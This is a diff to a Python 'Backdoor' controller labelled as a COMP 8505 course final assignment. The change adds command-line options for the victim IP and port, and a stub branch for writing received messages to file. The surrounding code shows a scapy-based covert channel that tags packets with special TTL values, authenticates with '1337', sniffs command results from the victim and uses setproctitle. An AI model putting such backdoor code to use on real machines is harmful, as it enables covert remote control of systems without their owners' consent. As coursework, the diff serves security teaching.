@@ -10,6 +10,7 @@ from multiprocessing import Process
 from cryptoutil import encrypt, decrypt
 from scapy.all import *
 import _thread
+import argparse
 import setproctitle
 
 """
@@ -18,9 +19,17 @@ Setup: pip3 install pycryptodome setproctitle scapy watchdog3
 
 TTL = 222
 TTLKEY = 234
-# random secret key (both the client and server must match this key)
 
-victim = ("192.168.0.3", 9999)
+# parse command line argument
+arg_parser = argparse.ArgumentParser(
+    prog='Backdoor',
+    description='COMP 8505 Final Assignment by Peyman Tehrani Parsa & Khang Tran'
+)
+arg_parser.add_argument('-p', dest='port', type = int, help = 'victim PORT', default=8888, const=8888, nargs='?')
+arg_parser.add_argument('-i', dest='ip', type = str, help = 'victim IP')
+args = arg_parser.parse_args()
+
+victim = (args.ip, args.port)
 messages = []
 authentication = "1337"
 setFlag = "E"
@@ -49,7 +58,7 @@ def packatizer(msg):
         msg {[type]} -- [description]
     
     Returns:
-        [type] -- [description]
+        [list of scapy.packets] -- [description]
     """
 
     # Create the packets array as a placeholder.
@@ -59,8 +68,6 @@ def packatizer(msg):
 
     # If not an array (if there is only one packet.)
     if(type(msg) is str):
-        # The transmissions position and total will be 1.
-        # i.e. 1/1 message to send.
         packets.append(craft(msg))
     # If an array (if there is more than one packet)
     elif(type(msg) is list):
@@ -139,6 +146,8 @@ def commandResult(packet):
             payload = str(''.join(messages)[2:-2]).replace("\\n", '\n')
             print('\n', payload)
             messages = []
+        elif flag == "P":
+            #writes messages to file
 
 
 def commandSniffer():
